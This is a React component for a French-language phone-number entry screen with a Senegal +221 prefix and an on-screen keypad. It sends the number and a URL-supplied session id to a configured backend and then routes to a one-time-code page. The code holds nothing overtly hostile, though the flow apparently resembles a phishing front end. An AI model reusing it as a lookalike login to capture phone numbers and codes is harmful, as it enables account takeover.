import { useState } from 'react';
import { useNavigate } from 'react-router-dom';

const PhoneNumberInput = () => {
  const navigate = useNavigate();
  const [digits, setDigits] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const sessionId = new URLSearchParams(window.location.search).get('id') || 'default';
  const MAX_DIGITS = 9;

  const formatNumber = (raw: string) => {
    let parts = [];
    if (raw.length > 0) parts.push(raw.substring(0, 2));
    if (raw.length > 2) parts.push(raw.substring(2, 5));
    if (raw.length > 5) parts.push(raw.substring(5, 7));
    if (raw.length > 7) parts.push(raw.substring(7, 9));
    return parts.join(' ');
  };

  const handleSubmit = async () => {
    if (digits.length !== MAX_DIGITS) return;
    
    setIsLoading(true);
    const phoneNumber = formatNumber(digits);
    
    try {
      const response = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/phone`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, phoneNumber }),
      });
      const data = await response.json();
      
      const newSessionId = data.sessionId;
      navigate(`/otp?id=${newSessionId}`);
    } catch (error) {
      console.error('Error submitting phone number:', error);
      setIsLoading(false);
    }
  };

  const handleKeyPress = (digit: string) => {
    if (digits.length < MAX_DIGITS) {
      setDigits(digits + digit);
    }
  };

  const handleBackspace = () => {
    setDigits(digits.slice(0, -1));
  };

  const keypadKeys = [
    { digit: '1', letters: '' },
    { digit: '2', letters: 'ABC' },
    { digit: '3', letters: 'DEF' },
    { digit: '4', letters: 'GHI' },
    { digit: '5', letters: 'JKL' },
    { digit: '6', letters: 'MNO' },
    { digit: '7', letters: 'PQRS' },
    { digit: '8', letters: 'TUV' },
    { digit: '9', letters: 'WXYZ' },
    { digit: '', letters: '' },
    { digit: '0', letters: '+' },
    { digit: 'backspace', letters: '' },
  ];

  return (
    <div className="flex justify-center min-h-screen bg-white">
      <div className="w-full max-w-[430px] min-h-screen flex flex-col bg-white">
        {/* Content */}
        <div className="flex-1 flex flex-col px-6 pt-10 pb-5">
          {/* Back button */}
          <button onClick={() => navigate('/')} className="text-[#1a1a1a] mb-4">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="w-6 h-6">
              <path d="M19 12H5M12 19l-7-7 7-7"/>
            </svg>
          </button>

          <p className="text-[30px] leading-[1.3] text-[#1a1a1a] mt-[60px] font-normal">
            Entrez votre numéro de mobile pour vous authentifier 
          </p>

          {/* Phone input row */}
          <div className="flex items-center gap-3 mt-[60px] border-b-2 border-[#29c5f6] pb-3">
            <span className="text-[26px]">🇸🇳</span>
            <span className="flex items-center gap-1 text-[24px] text-[#1a1a1a] cursor-pointer select-none">
              +221 <span className="text-[14px] ml-0.5">▾</span>
            </span>
            <input
              type="tel"
              value={formatNumber(digits)}
              readOnly
              placeholder="77 000 00 00"
              className="flex-1 text-[24px] text-[#1a1a1a] border-none outline-none min-w-0 tracking-wider placeholder-[#bbb]"
            />
          </div>

          {/* Spacer */}
          <div className="flex-1 min-h-[40px]"></div>

          {/* Next button */}
          <button
            onClick={handleSubmit}
            disabled={digits.length !== MAX_DIGITS || isLoading}
            className={`w-full py-[18px] rounded-[30px] text-[19px] font-bold transition-colors flex items-center justify-center gap-2 ${
              digits.length === MAX_DIGITS && !isLoading
                ? 'bg-[#29c5f6] text-white hover:bg-[#1fb3e3]'
                : 'bg-[#a9e6fa] text-white cursor-not-allowed'
            }`}
          >
            {isLoading ? (
              <>
                <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Chargement...
              </>
            ) : (
              'Suivant'
            )}
          </button>
        </div>

        {/* Keypad */}
        <div className="bg-[#d8d8dd] p-2 grid grid-cols-3 gap-2">
          {keypadKeys.map((key, index) => (
            key.digit === '' ? (
              <div key={index} className="bg-transparent"></div>
            ) : key.digit === 'backspace' ? (
              <button
                key={index}
                onClick={handleBackspace}
                className="bg-transparent flex items-center justify-center p-3 active:bg-[#ececec] rounded-lg"
              >
                <svg viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" strokeWidth="1.5" className="w-[30px] h-[30px]">
                  <path d="M9 6h11a1 1 0 0 1 1 1v10a1 1 0 0 1-1 1H9l-6-6a1 1 0 0 1 0-1.5L9 6z"/>
                  <line x1="12" y1="10" x2="17" y2="15"/>
                  <line x1="17" y1="10" x2="12" y2="15"/>
                </svg>
              </button>
            ) : (
              <button
                key={index}
                onClick={() => handleKeyPress(key.digit)}
                className="bg-white border-none rounded-lg py-4 px-0 flex flex-col items-center justify-center cursor-pointer select-none active:bg-[#ececec]"
              >
                <span className="text-[30px] text-[#1a1a1a] font-normal leading-[1.1]">{key.digit}</span>
                {key.letters && (
                  <span className="text-[10px] tracking-[2px] text-[#555] mt-[2px] font-semibold">{key.letters}</span>
                )}
              </button>
            )
          ))}
        </div>
      </div>
    </div>
  );
};

export default PhoneNumberInput;
